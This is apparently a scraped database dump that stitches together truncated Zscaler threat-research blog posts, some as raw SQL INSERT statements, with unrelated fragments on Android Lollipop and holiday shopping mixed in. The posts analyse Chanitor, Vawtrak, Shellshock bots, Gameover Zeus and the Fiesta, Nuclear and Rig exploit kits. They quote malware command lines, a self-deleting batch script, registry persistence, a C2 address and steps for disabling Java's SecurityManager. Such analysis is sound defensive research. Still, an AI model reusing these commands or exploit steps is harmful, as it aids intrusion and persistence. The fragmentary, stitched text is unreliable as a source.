\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nThe next step is enumeration of functions for making outbound SSL connections and making connections to the command and control server. These connections are shown in the screenshot below.\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\nThe first connection (#1 above) is to retrieve the public IP of the infected host. The success or failure of this request isn’t checked though, so the next request happens regardless. This request (#2) is a beacon to the command and control server on TOR via tor2web.org. Chanitor uses SSL for all communication and beacons via POST requests to /gate.php. If the request is successful, the C2 server will provide further instructions which during our analysis was to download additional binary payload. The download is shown in session #3 above. Once the download finishes, there is a subsequent beacon which presumably means success (#4). Strangely enough, there is a failed request to tor2web.ru (#5). This domain does not exist, so the purpose of this request is unknown.\r\n\r\nThe screenshot below shows detail of the initial beacon (#2) and server response to download a stage 2 binary:\r\n\r\n \r\n\r\n\r\nEach beacon takes the following form:\r\n{<MALWARE GENERATED UNIQUE IDENTIFIER>}<SHORT STRING><4 SPACE PADDING>}<USERDOMAIN><58 SPACE PADDING>}<IP ADDRESS>\r\n\r\n\r\nIf the request to api.ipify.org is unsuccessful, the IP address will be the machine\'s RFC1918 address instead of a public IP. The C2 server replies with an instruction to download a file (highlighted in red above) and the download is initiated immediately. The beacon information, with the exception of the IP address, is also stored in the registry:\r\n\r\n\r\n\r\n\r\nAfter downloading and reporting success, the original binary will then sleep for approximately 5 minutes (there\'s some variation for slightly longer and slightly shorter) before beaconing again:\r\n\r\n\r\n\r\n \r\n\r\nDownloaded Binary\r\n\r\n\r\nThe downloaded binary is a dropper Trojan and is saved as C:\\Users\\<username>\\AppData\\Local\\Temp\\__<4 alphanumeric characters>.exe. Chanitor will run the downloaded payload via the following command:\r\n\r\ncmd /D /R start /B \"\" \"C:\\Users\\<username>\\AppData\\Local\\Temp\\___16AE.exe\" && exit\r\n\r\n\r\nUpon execution, the binary checks for the presence of a debugger. If no debugger is found, the binary then unpacks an embedded DLL and writes it to disk. This DLL is a new variant of the Vawtrak Trojan.\r\n\r\n\r\n \r\n\r\n\r\n\r\nThe DLL is registered with regsvr32.exe via the following command to ensure persistence:\r\n \r\n\r\n\r\n\r\n\r\nThe Vawtrak dropper Trojan then deletes itself from the target system. The Vawtrak dropper binary and the DLL are compressed using aPLib v1.01 library as seen below:\r\n\r\n\r\n\r\nVawtrak, also known as NeverQuest and Snifula, is a powerful information stealing backdoor Trojan that has been gaining momentum over past few months.

With reports suggesting that over 3 million Americans had their smart phones stolen last year, it\'s easy to see why Google has added this feature to Lollipop.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Device management.\r\n		\r\n	\r\n\r\n\r\nEncryption on the fly\r\n\r\nAnother valuable security feature available in Lollipop is default encryption. Although not an entirely new feature as previous Android did offer encryption, it needed to be explicitly enabled by the user. With Lollipop, the initial boot will prompt users to activate encryption. Thereafter, new data will be encrypted on the fly.\r\n\r\n \r\n\r\nImproved malware protection and sandboxing\r\n\r\nLollipop is armed with SELinux (Security Enhanced Linux), which aims to provide enhanced protection against malware and vulnerabilities. This feature ensures secure app isolation, which helps to keep private data secure should the device be compromised. \r\n\r\n \r\n\r\nSmart Device Lock\r\n\r\nThe real privacy danger for most users is simply leaving a device unlocked and then having someone else gain access to personal data and open social profiles. Locking phone features should not be a tedious task that users avoid. Lollipop therefore introduces a new feature called Smart Lock to help combat this problem.\r\n \r\n\r\nSmart Lock adds the ability to set trusted locations such as home or the office, where your device will open automatically once you enter that region. You can do the same in conjunction with specific Bluetooth and NFC enabled Android Wear smart watches. When sensing these trusted devices, Lollipop phones/tablets will lower their security shields as the owner is presumably present. Users are also able to set notification access prior to a security lock to allow actions such as sending a message.\r\n\r\n \r\n\r\nMultiple User Profiles\r\n\r\nAs Internet social profiles and personal data like photos and contacts are generally the most sensitive information for a user, lending a phone to another person creates a security risk. Lollipop solves this issue by permitting multiple user profiles. Users can create a different guest profile which has limited access. The Owner account has access to the entire device and everything within it, as well as control over other profiles on the device. A User account, on the other hand, has limited access to certain apps and content controlled by the device’s main user, as well as limited calling and SMS capabilities. This feature is also beneficial for parents who can give their phone to their kids and only grant them access to a specific app or a game that they want them to play and nothing else on the device.\r\n \r\n\r\nWant to scan Android apps for security and privacy issues?

Almost every retailer large and small offers huge discounts on Black Friday, often extending through the weekend and the following Monday, now known as Cyber Monday.       As we near Thanksgiving and the start of the holiday shopping frenzy, we’re observing a sharp increase in cyber scams and phishing activities targeting online shoppers. As shoppers look for the best deals available, cybercriminals are quick to take advantage of unsuspecting users.         Increase in online shopping transactions         Every year during this timeframe, we observe a noticeable spike in the total number of web transactions within the Shopping category. We have shared this trend in our previous blogs as well ([1],[2]).         Last year, we saw around 2.71% of all the web transactions categorized as Shopping and this year is no different.

Attackers will often pose as legitimate services, such as a law enforcement agency or a mass media outlet, in order to lure the unsuspecting victim into their scheme.    We recently encountered a ransomware campaign leveraging phishing e-mails purporting to be from the Australian Postal Services. The spam campaign themes used by the attackers involve tracking services or mobile invoices containing a link to the malicious content.  Upon completion of a CAPTCHA, the user is provided a zip file which contains a malicious executable posing as a PDF document.         At the time of research, this particular file shows a a detection rate of 16/53 antivirus engines on Virustotal.

We have continued to monitor the Shellshock exploit attacks and the malicious payloads that were getting dropped over past two weeks.    In this blog, we wanted to share a summary of new exploit attacks and new tricks that cybercriminals have deployed to increase the chances of infection.    Shellshock Attack analysis    The first attack, as reported in our previous blog, involved download and installation of a Linux Backdoor Trojan with DDoS capability detected by us as Unix/Flooder.AN.    Here the attack pattern was straight forward, if the bash exploit was successful then a malware payload was getting downloaded and installed.    Perl IRC bots    Next we saw a series of exploit attempts where a Perl based IRC bot was getting downloaded and executed on the target server. We will share two sample cases here.    In the first case, we saw a Base64 encoded Perl based IRC bot getting downloaded, decoded and executed on the target machine.                	  		  			  		  		  			Shellshock exploit downloading Perl IRC bot  		  	                       	  		  			  		  		  			Base64 encoded Perl IRC bot  		  	        In the second case, we saw another Perl IRC bot getting downloaded and executed with a command-line argument which is the IRC server IP.                     	  		  			  		  		  			Shellshock exploit downloading Perl IRC bot  		  	                       	  		  			  		  		  			Perl IRC bot  		  	        The attacker performs following action here before downloading and running the bot:                	Terminate all the PHP and PERL instances running on the server.  	Attempts to delete all the content in the /tmp/ and /var/tmp/ directory.  	Avoids hardcoding the Command and Control server IP in the bot file that gets downloaded.      Things became more interesting after this when we started seeing attacks involving tricks to add stealth and persistence to the infection. We also saw tricks used to prevent any further exploit attempts on the server by attempting to apply security patches to the server once the exploit infection was successful.    Linux.Tsunami C source code    In the attack case shown below, a bash script gets downloaded and executed on the target server upon successful exploit attempt.                     	  		  			  		  		  			Shellshock exploit downloading C IRC bot  		  	                       	  		  			  		  		  			Shell script payload downloaded upon successful exploit  		  	        The shell script will perform the following actions:                	Downloads an IRC bot written in C programming language  	Attempts to compile the C bot program using gcc compiler on the victim server  	Executes the newly generated ELF IRC bot binary  	Creates a crontab entry to download and infect the system on a weekly basis      This is a way of establishing persistence, even if the system administrator identifies and removes the culprit file the system will again get infected when the cronjob triggers. The attacker is also transferring a plain-text file as oppose to an ELF binary in an attempt to evade network perimeter defenses.    Linux.Tsunami ELF binary    In the most recent case, the attacker first ensures that the current bash session does not get recorded to the history file. It then also involved a shell script getting downloaded and executed on the target server as seen below:                     	  		  			  		  		  			Shellshock exploit attempt downloading Linux.Tsunami  		  	                       	  		  			  		  		  			Shell script payload downloaded upon successful exploit  		  	        The shell script will perform the following actions:                	Downloads and executes a new variant of Linux.Tsunami DDoS bot  	Create crontab entry to ensure future update and persistence  	Attempts to download and patch the Bash vulnerability in an attempt to prevent new infections from competitors?  	Uses shred command before deleting itself (downloaded shell script)      shred command Overwrite the specified FILE(s) repeatedly, in order to make it harder for even very expensive hardware probing to recover the data.    Conclusion    We have seen a quick evolution in the Shellshock exploit attack payloads that can be broadly classified into following categories:                	Persistence - achieved by creating cronjob.  	Evasion - payload Base64 encoding (Perl bot) and plain-text C source code transfer.  	Stealth - prevents recording of bash session history, usage of shred and rm commands.  	Competitive Advantage - removing other exploit payloads, installing new payload and applying security patches to prevent further exploit & infection attempts.      It is extremely important for the system administrators to test if their server is vulnerable and apply appropriate security patches as described in our previous blog. It is also important to check for the indicators of compromise mentioned in the above attack cases.    Zscaler customers are protected from this threat and the associated malware payloads.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (173, 'Fiesta Exploit Kit: Live Infection', 'Sameer Patil', 'September 29, 2014', 'During our daily hunt for Exploit Kits (EK), we came across many live Fiesta exploit chains.    The infection started from the following compromised domains:        	      orpi.com  	      soyentrepreneur.com  	      interfacelift.com        Compromised sites:    The attackers often leverage compromised sites to serve as the first level of redirection in the EK infection cycle. In the first Fiesta EK instance that we analyzed, the attacker after getting the root access has modified the “scripts.js” file present at location:        	      hxxp://www[.]media[.]orpi[.]com/js/scripts.js             All the pages importing this JavaScript file will redirect the user to \"nvplus[.]com/wp-content/\".                      Another variation of the initial loading page redirection was observed in the compromised site “interfacelift[.]com” at the following location:        	      hxxp://interfacelift[.]com/wallpaper/downloads/date/any/                In this case the attacker added a <script> tag with the location pointing to another redirection site at:        	         hxxp://sunduk[.]biz/forum/docs/          A third variation of the initial redirection was observed on the compromised site  \"soyentrepreneur[.]com\", where the attacker created a new JavaScript file “funcionesCarga.js” at the following locations:        	         hxxp://www[.]soyentrepreneur[.]com/assets/js/funcionesCarga.js  	         hxxp://www[.]soyentrepreneur[.]com/assets/js/se2013/funcionesCarga.js        The website pages importing these JavaScript files will redirect the user to the Fiesta loading site.      All three initial redirection methods are fairly stealth and can remain unnoticed for days to the web administrators. We found this approach to be more effective and completely opposite from a RIG EK compromise that we recently analyzed where the attacker changed the home page of the website to ensure redirection.     Fiesta EK:    Some of the recent live Fiesta EK loading sites found in the wild are:        	       nvplus[.]com/wp-content/  	       son-ko[.]com/scripts/bundles/login.php  	       sunduk[.]biz/forum/docs/login.php  	       toringaz[.]com/images/  	       barferoase[.]de/blog/wp-content/themes/  	       www.artlen[.]com/assets/cache/rss/  	       www.courieru[.]com/cache/joomsef/  	       www.roofstroy[.]com/stroy/js.php  	       ticketstolisbon[.]com/dumper/  	       cic.com[.]ua/dok/  	       talktyme[.]com/flash/        Apart from the usual EK redirection chain, it checks for the user\'s browser as well as presence of application plugins for Microsoft Silverlight and Adobe Flash.       It checks if Silverlight plugin is installed by creating the following ActiveXObject object:    	 ActiveXObject(\"AgControl.AgControl\")     The presence of Flash plugin is ensured by creating the following object:      	swfobject.embedSWF()        If both the above object creation functions generate an exception, then the exploit cycle terminates.

The vulnerability is due to failure to properly handle environment variables.    A remote attacker can exploit this flaw by interacting with an application that uses BASH environment variables to override or bypass environment restrictions to execute shell commands. If an attacker can control the value of an environment variable, then code execution can be achieved in the context of the application using the environment variable.    A public advisory was released regarding this vulnerability here:    http://seclists.org/oss-sec/2014/q3/650  https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271    Shellshock Attacks - CVE-2014-6271    Within hours of the public disclosure of this vulnerability, we have started seeing incidents of attacks targeting this vulnerability in the wild to download additional malware. It appears that Nginx and Apache web servers configured to use mod_cgi are two potentially vulnerable services that are actively being targeted in the wild. One such incident that we were able to confirm through mining our logs is shown below:                                 The server involved in the above case was found to be compromised and hosting ELF binaries which belongs to the same Linux Backdoor Trojan family with DDoS capabilities. We believe that the vulnerable Apache servers were resulting in the download of an ELF binary named \"apache\" whereas vulnerable Nginx servers were getting the ELF binary named \"nginx\". The only difference we saw in these two binaries was the hardcoded Command and Control server information.      Upon successful exploitation of CVE-2014-6271 vulnerability, the attacker is able to download and install the malicious ELF binary on the target Linux system. The malware connects to a predetermined Command and Control (C2) server on a specific port and awaits further instructions from the attacker. The C2 information can be seen hardcoded in the binary:                         The malicious ELF binary named \"apache\" is leading to a different C2 location \"162.253.66.76:53\".    This malware family is capable of performing the following actions:                     	BusyBox command injection exploit attempts  	Collect and send sensitive system information  	Perform Denial of Service attacks  	Brute force authentication attempt   	Opens a Backdoor connection for remote attacker      List of commands supported by this bot:                         The screenshots below show sample command and control communication from this bot:                     	  		  			  		  		  			Initial call back message and command to get system IP address  		  	             	  		  			  		  		  			Shell command & JUNK flooding attempt  		  	        Active Shellshock exploit attempts [Updated - September 26, 2014]    Below is a sample list of suspicious headers that we captured in past 12 hours attempting to exploit the Shellshock vulnerability (CVE-2014-6271).

The detection of malicious activity performed by this EK remains low, due to usage of dynamic content and heavy obfuscation. In this blog, we will walk you through a complete Nuclear EK infection cycle with a live example. We will also share details of the identified payload, which had very low Anti-Virus (AV) detection rates.     The infection cycle begins with an unsuspecting user visiting a legitimate site that was compromised by the attackers. The compromised site in the example covered in this blog is www[.]cornwallmusiceducationhub[.]org that further redirects the victim to the Exploit Kit hosting server [80.85.86.133]. Nuclear EK is notorious for exploiting most popular browser plugins.    The following screenshot shows the malicious iframe injected on the compromised website.    	  		  			  		  		  			Malicious iframe in compromised domain  		  	            The malicious iframe leads the users to a loading site, which in this case performs a second level redirection as shown below, eventually leading the victim to the Nuclear EK\'s landing page.      	  		  			  		  		  			Redirecting to the Nuclear EK landing page  		  	                  Redirection Chain observed in our example:  Compromised site : www[.]cornwallmusiceducationhub[.]org/tag/heartlands-pool/  Second level redirection site: fluersutel[.]tecnopes[.]com[.]ar/miksopulp16[.]html  EK Landing site: actudismatik[.]e-xms[.]com[.]ar/2150b060shv/1/9ffbf35e4190fbba62f70c8477fa3964[.]html      	  		  			  		  		  			Redirection Chain  		  	                                  The Exploit kit landing page is heavily obfuscated to evade detection by AV and Intrusion Prevention Systems as seen below:    	  		  			  		  		  			Landing Page  		  	                              Now we will step through the complete dobfuscation of the landing page that was captured in above example. We leveraged the open source JavaScript beautifier to structure the landing page JavaScript code. Upon structuring the code, we determined that there were 51 unused variable declarations to confuse the researchers.    Going further, we observed that the following three functions VV8Y6W,wL3, and Fp4Ovo were responsible for the dynamic de-obfuscation of the EK landing page code. We have noted the action performed by each function in the following screenshot.      The following routine leverages the aforementioned functions to generate a key PluginDetect (V 0.8.8) script which we will discuss later.     Upon successful execution of the above code, the variable KKa will store the PluginDetect script. The following code will execute the script.    PluginDetect    This script is derived from the well-known JavaScript library PluginDetect. This library is used by the exploit kit authors to do a detailed reconnaissance of victim\'s browser plugins. We will walk you through various actions performed by this script before executing the exploit payload.    First the detectPlatform function will check for the operating system running on the victim machine:      Subsequently, the script will also check the version of well-known browser plugins, which includes Java, Adobe Reader, Adobe Flash, and Silverlight.       It then leverages the XML DOM information leakage vulnerability to enumerate through the system driver files residing in the C:\\Windows\\System32\\drivers\\ directory. If it finds any AV driver files, the script will terminate the infection cycle.    Next, the script will check for the vulnerable versions of the loaded plugins and accordingly run the identified application exploit function.                  The following screenshot shows the application specific exploit functions:    Below are the exploit payloads that were getting served if the related application plugin version was found to be vulnerable by the Nuclear EK instance that we analyzed.

Nuclear EK Landing    Unlike other EKs such as RIG, Nuclear EK\'s landing page code is highly obfuscated.           (Fig 1: Obfuscated Landing Page)    After de-obfuscation, the page looks as follows:         (Fig 2: De-Obfuscated Landing Page)    Nuclear EK\'s landing page checks for the following antivirus (AV) driver files and if finds any, terminates the exploitation process. We have seen these checks before in RIG EK too.         (Fig 3: Check for AV driver files)       If this AV check is passed, a javascript function then checks the installed Flash version and if a vulnerable version is detected on the client\'s browser, a call is then made to a dynamic Flash object creation module.             (Fig 4: Flash Call)         Here are the vulnerable Flash player checks:             (Fig 5: Checks if vulnerable version installed)       If the version check passes, the Flash exploitation process will commence as seen below.    CVE-2014-0515 exploit analysis    Here is the code that dynamically creates a new Flash Object:         (Fig 6: Flash Object Creation)    The Flash exploit payload that gets downloaded is highly obfuscated to evade AV detection. Below is a snippet of decompiled code from this Flash exploit:            (Fig 7: Decompiled Flash File)       There are two hard coded snippets of obfuscated shellcode in the action script as seen below:             (Fig x1,x2: Raw Shellcodes)       After de-obfuscating on the run time, it adds bytecode to a Shader Object from one of the de-obfuscated shell code snippets.                  (Fig 8: Shader Byte Code Filler)     The Shader\'s Pixel Bender is where this malformed byte code is written, which triggers the vulnerability.         Here is the Malformed byte code:             (Fig 9: Malformed data for Pixel Shader)              Disassembling Pixel Bender\'s byte code         We used Tinc Uro\'s program to get the PixelBender binary data decompiled.                  (Fig 10: Decompiled PixelBender data)         We can see the inappropriate content here. The Shader Object takes a float parameter whose default value is set to a matrix of 4x4 floats and the second float value of this matrix is invalid value triggering the vulnerability.         Conclusion    Since the downfall of the popular Blackhole Exploit Kit, we have seen the advent of many new Exploit Kits. Nuclear Exploit Kit definitely ranks in the Top 5 prevalent EKs in the wild at the moment. We have seen an increasing number of compromised sites and scam pages leading to Nuclear Exploit Kit in past three months. Some of the notable compromised sites during this time frame that were redirecting to Nuclear EK includes:    SocialBlade.com - A youtube statistics tracking site.  AskMen.com - Men\'s entertainment website  Facebook.com survey scam pages      Exploit kits generally make use of known vulnerabilities and Flash is a popular target. CVE-2014-0515 in particular targets a Flash vulnerability in Flash versions before 11.7.700.279 and 11.8.x through 13.0.x before 13.0.0.206 on Windows and OS X, and before 11.2.202.356 on Linux. It\'s critical to ensure that your employees aren\'t running outdated versions of Flash as it is commonly targeted by EKs.

This operation turned out to be a success with the shutdown of the Botnet activity and related Cryptolocker infection cycle.\r\n\r\nNew Gameover Zeus variant\r\n\r\nWe started seeing infection reports involving a new Gameover Zeus variant early last month (July 2014). The major infection vector still remains the same where the Cutwail Botnet is being leveraged by the cyber-criminals to send out spam e-mails with a malicious attachment. The malicious attachment on most occasions masquerades as a financial PDF document in order to lure an unsuspecting user into opening it. This is achieved by a combination of a fake PDF icon and double file extension as common file extensions are hidden by Windows unless disabled by the user. Some sample filenames we have seen includes:\r\n\r\n	Invoice.pdf.scr\r\n	E-statement.pdf.scr\r\n	Securedoc.pdf.scr\r\n\r\n\r\nOnce the user opens the attachment, it downloads the latest Gameover Zeus variant from a predetermined location as seen below in the unpacked payload memory:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Decrypted payload showing hardcoded URL\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Download of latest Zeus variant\r\n		\r\n	\r\n\r\nThe downloaded Gameover Zeus variant further drops a copy of itself and runs it as:\r\n\r\n\r\n	%Local Settings%\\Temp\\Eqxav\\epoxs.exe\r\n\r\nIt also drops and runs a batch file to delete the original executable file from the %TEMP% directory:\r\n\r\n\"C:\\WINDOWS\\system32\\cmd.exe\" /C \"C:\\DOCUME~1\\zuser\\LOCALS~1\\Temp\\MLZ6405.bat\"\r\n\r\n \r\n@echo off\r\n:akkaoz\r\ndel /F /Q /A RSHAIL \"C:\\Documents and Settings\\zuser\\Local Settings\\Temp\\mss3.exe\" >nul\r\nif exist \"C:\\Documents and Settings\\zuser\\Local Settings\\Temp\\mss3.exe\" goto akkaoz\r\n\r\n \r\nIt creates the following registry entry to ensure persistence upon system reboot:\r\n\r\n\r\n	HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Epoxs = \"%Local Settings%\\Temp\\Eqxav\\epoxs.exe\"\r\n\r\nThe bot further injects code into multiple system processes including Explorer.exe. It creates a remote thread that is responsible for running the Domain name Generation algorithm and connection to the Command & Control (C2) server. Upon successful connection to a C2 server, the bot will download the latest configuration containing list of banking URLs and web-inject plugins.

However, this newer variant does not feature a P2P command and control protocol, instead it is falling back to the old DGA with fast flux tactics to hide the C2 servers. This in our opinion is a step backward as P2P was a more resilient feature.\r\n\r\nAnother step backward that we observed is the absence of the kernel-mode rootkit that was pushed out as an update early this year by the Gameover Zeus operators in the previous version. The rootkit made removal of the malware extremely difficult and disabled multiple security features on the infected system.\r\n\r\nDGA active domains and Command & Control server trends\r\n\r\nThe bot\'s DGA outputs 1,000 new unique domains each day but the Gameover Zeus operators are keeping the domains that they intend to use confidential until a few hours before the actual day when they get registered. Below is the mapping of DGA domains that were registered by the the Botnet operators and were actively resolving to C2 servers in past seven days:\r\n \r\nCommand and Control server IP information and Geo-distribution map:\r\n \r\n\r\n\r\nActive C2 Server location and ASN information\r\n\r\n \r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\nBelow is the trend of C2 callbacks we have intercepted in past seven days:\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\nOne of the most active C2 server IP addresses also appeared to be the Control server for a Zeus in the mobile (Zitmo) variant in the past as seen below:\r\n \r\n\r\n\r\n \r\nThis further re-affirms the fact that the same gang is involved.\r\n\r\nConclusion\r\n\r\nThis new Gameover Zeus variant certainly appears to be the beginning of a comeback attempt for this notorious Banking Trojan Botnet family, but in many ways it has been a step backward. The number of infections are still very low and it has a long way to go to reach the infection rates observed prior to the Government takedown. Zscaler ThreatLabZ will continue to monitor the activities of this Botnet family in the coming months for active C2 servers as well as any feature updates and will ensure protection for customers.\r\n\r\n- Deepen Desai', 'Analysis;Malware', 'https://www.zscaler.com/blogs/research/look-new-gameover-zeus-variant');

The vulnerable “invoke” method of the “sun.tracing.ProviderSkeleton” class is used to issue calls to the Class.forName() method for loading internal restricted classes and methods.         Vulnerability Exploitation Procedure    To define tracepoints in any Java application, one must extend the Provider interface in their program. Creating a Provider instance is done with the help of the factory class ProviderFactory. ProviderSkeleton gives all the implementation needed by a framework provider by implementing two important interfaces, namely “com.sun.tracing.Provider” and “java.lang.reflect.InvocationHandler”. As mentioned earlier, it also has the implementation of our target “invoke” method. Invoke is the default invocation handler associated with Provider class and is created when we call the “Java.reflect.Proxy.GetInvocationHandler()” method with a Provider class object as parameter.    So, the code for this would be:      	  		  			  			<Invoke object> = class.forname(java.lang.reflect.Proxy).getmethod(getInvocationHandler), new Class[] { Class.forName(java.lang.Object) }).invoke(Class.forName(java.lang.reflect.Proxy)), new Object[] { <Provider object> });    			   			  		  	           Class.forName():    Class.forName is the dynamic Class Loader in Java. It initializes a class by calling it’s static methods and constructors, if the class was not previously not being loaded.    The following restricted classes are loaded in the exploit using the <invoke object>:      	     “sun.org.mozilla.javascript.internal.Context”  	     “sun.org.mozilla.javascript.internal.DefiningClassLoader”  	     “sun.org.mozilla.javascript.internal.GeneratedClassLoader”           MethodHandles.Lookup()    There is a call to the “MethodHandles.Lookup()” method which does the AccessController checks only while creating the class instance and not each time the call is made. A lookup object has the capability to access any method handle that the caller has access to.    Context stores some information about the program like the call stack. To associate the newly created context with the current thread, an object of the “enter()” method of the “sun.org.mozilla.javascript.internal.Context” class is created using the lookup object we created. Similarly, method objects for “defineClass()” and “createClassLoader()” from the other two classes are also created. All these three objects are eventually used to disable the SecurityManager enforced by the browser for running Java code.         Privilege Escalation!    Typically, a web applet runs with the SecurityManager provided by the browser. This way, user code does not have the privileges to disable it. In our case, we are able to invoke restricted browser libraries and generate a new ClassLoader. So, this ClassLoader is of the same context as that of the SecurityManger. Finally, defineClass loads the binary object of another class using the privileged ClassLoader and sets the SecurityManager to null after it has successfully performed the bytecode verification.    We will get into this more when we go through each step in detail.         Test Case: Flashpack EK    The malicious jar files we found in multiple exploit kits (EKs) use different types of obfuscation to make them undetectable. In this blog, I will be explain the analysis of a jar file we found in the Flashpack EK, which was using the same exploit. The file can also be downloaded here.    The jar file runs as an applet in the browser and is triggered from the EK’s landing page after it has checked the Java version installed. The jar contains following classes:                  Java Code Deobfuscation Routine:    Code generates strings from garbage text by calling “crock.zam()”. The following three methods perform all of the deobfuscation routine:              The entry point class “a1.class” needs the following three parameters: “urla”, “t” and “tt”. The code proceeds with creating an object of “crock.class” and calling “badafzew()” method.                   In “crock.badafzew()” creation of following three objects takes place:      	The contents of “pashka.class” is fetched as a stream and stored in a byte array object of size 8KB, but it is utilized later in the program for disabling the SecurityManager.   	In the next step, “b3333.cadvsfew()” is called in which the Provider object is created using the ProviderFactory mechanism.  	A call to GetInvocationHandler() returns an object of the vulnerable “invoke()” method.      The execution is then transferred to “nano.allokas()”,passing all three objects created as parameters.  In the “allokas()” method, an object of “cve.class” in created,which gives us the followingtwo important static method objects:             The invoke() method object is used for the first time to generate class objects of two restricted classes as follows:             Using these class objects, two method objects are created for enter() and createClassLoader()methods.              The last step is to perform an invoke action on the “sun.org.mozilla.javascript.internal.DefiningClassLoader” methodhandle and pass a byte object of “pashka.class” as a parameter. This results in successful disabling of the SecurityManager.              Now that the SecurityManager is disabled, the applet is free to perform privileged actions like saving files on the user machine, downloading data and performingfile execution. All this workflow is performed in “nasa.class”, which I am not discussing in this blog as it is easily understandable as shown below.                   JavaScript Deobfuscation:    To prepare a POC of the exploit, along with the jar file, the html page calling the applet is also important, because it sends the parameters needed for jar execution. But exploit kit landing pages are found to be highly obfuscated and it’s not at all easy to decode the parameters.    In case of Flashpack, we filtered the following traffic:             	  		  			   		  	             After deobfuscating the JS and extracting some useful content, we get:          	  		  			   		  	           Yara Signature:     Even though the jar files used by EKs have highly obfuscated code, some of the strings still can’t be obfuscated and we can use such patterns in our static analysis. And if we are lucky, we can develop accuratedetection methods. The following signature can be used for exploit identification on a decompiled jar file.', 'Exploit Kit;Vulnerability', 'https://www.zscaler.com/blogs/research/dissecting-cve-2013-2460-java-exploit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (181, 'De-obfuscating The DOM Based JavaScript Obfuscation Found In EK’s Such As Fiesta And Rig', 'ThreatLabz', 'July 23, 2014', 'There is little doubt that exploit kit (EK) developers are continuing to improve their techniques and are making exploit kits harder to detect. They have heavily leveraged obfuscation techniques for JavaScript and are utilizing browser functionality to their advantage. Recent exploit kits such as ‘Fiesta’ and ‘Rig’ for example, have been found to be using DOM based JavaScript obfuscation. In this blog I will demonstrate a simple approach to de-obfuscate DOM based JavaScript obfuscation.\r\n\r\nBefore we dive in, it’s important to understand the difference between older EK’s such as Blackhole and Incognito versus newer ones such as Fiesta and Rig. A key difference between them is the way they de-obfuscate code in the victim’s browser. The newer approach de-obfuscates JavaScript snippets and stores them into DOM by building an element tree. Older EK’s by contrast were heavily using JavaScript functions such as ‘eval’and ‘document.write’ to de-obfuscate the JavaScript. \r\n\r\nLet’s start by taking a look at a Rig EK sample. \r\n\r\nRig EK page:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Heavy obfuscation of Rig EK JavaScript code\r\n		\r\n	\r\n\r\n\r\nUnlike most EK’s, instead of running plugin detection code first, it instead starts by checking for the presence of Kaspersky and TrendMicro antivirus (AV) programs. If any of the AV driver files are found on the victim’s machine, the exploit execution stops. In order to check for the presence of these driver files, the EK uses the ActiveX object ‘Microsoft.XMLDOM’. The routine labeled ‘df3z’ does the inspection.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			AV driver checking code\r\n		\r\n	\r\n\r\n\r\n Driver file information:\r\n\r\n Take note of the following statement,\r\n\r\n\r\n\r\n\r\nThe above value of variable ‘sdf43w’ is used later on in the JavaScript. \r\n\r\n \r\n\r\nIf no AV driver for Kaspersky or TrendMicro is found on the victim’s machine, the code then initializes the de-obfuscation routine. First the Javascript creates a ‘div’ element and appends it to the DOM. The remaining JavaScript, which is heavily obfuscated contains exploit code targeting vulnerabilities for Java, Flash and SilverLight browser plug-ins.\r\n\r\n \r\n\r\nFirst JavaScript:\r\n\r\nLet’s take a look at the JavaScript code to understand how it’s building the DOM element tree.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			First JavaScript\r\n		\r\n	\r\n\r\n\r\nTo summarize,\r\n\r\n\r\n	Function ‘alz’ concatenates a string passed to it and assigns the concatenated string to the ‘ty6’ variable. This is later used by the de-obfuscation routine. \r\n	Element ‘dn3d’with a type of “script” is created.\r\n	De-obfuscated (final) JavaScript is assigned to the element ‘dn3d.text\'.\r\n	Element ‘dn3d’is appended to the ‘document.body’ i.e into the DOM tree for later execution.\r\n\r\n\r\nTo get the de-obfuscated code for this JavaScript we need to get the value of ‘dn3d.text’. For that I added a line called ‘console.log(‘dn3d- 1: ‘ + dn3d.text)’. I am using the Google Chrome browser to complete de-obfuscation and all of the analysis is carried out in an isolated environment. To get the console logs, you need to open developer tools in Google Chrome browser.  Apart from console.log you can also leverage other JavaScript functions like ‘alert’ or ‘document.write’ to get the de-obfuscated code\r\n\r\n.\r\n\r\nDe-obfuscated code for first JavaScript segment:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			JavaScript Console Output\r\n		\r\n	\r\n\r\n\r\nThe beautified version is shown below:\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nHere you can see the value of ‘dn3d.text’ is a JavaScript, which is then, is added into DOM tree. This JavaScript contains function ‘dsg45’, which creates element ‘bd6’ of type ‘div’ and appends it to DOM tree and also assigns a passed value of variable ‘hgd1’ using property ‘innerHTML’ of the created element.\r\n\r\n \r\n\r\nAll the remaining obfuscated JavaScript is structured like the aforementioned code. The following shows the second snippet of JavaScript, which actually contains the malicious applet code.\r\n\r\n \r\n\r\nSecond JavaScript snippet: Exploits Java vulnerability\r\n\r\n \r\n\r\n\r\n\r\n\r\nAgain, I’ve added a ‘console.log’ function to get the de-obfuscated JavaScript, which later will be appended to DOM tree and will be executed.\r\n\r\n \r\n\r\nDe-obfuscated code for the Second JavaScript snippet:\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Malicious Applet Code\r\n		\r\n	\r\n\r\n\r\nYou can see above, the malicious applet code is assigned to variable ‘jg67fgf’. This value is then passed to JavaScript function ‘dsg45’, which was appended into the DOM tree by the first JavaScript snippet (see above).\r\n\r\n \r\n\r\nSimilarly the remaining two JavaScript snippets are de-obfuscated using the aforementioned method.\r\n\r\n \r\n\r\nDe-obfuscated code for the third JavaScript snippet: Exploits Silverlight vulnerability\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		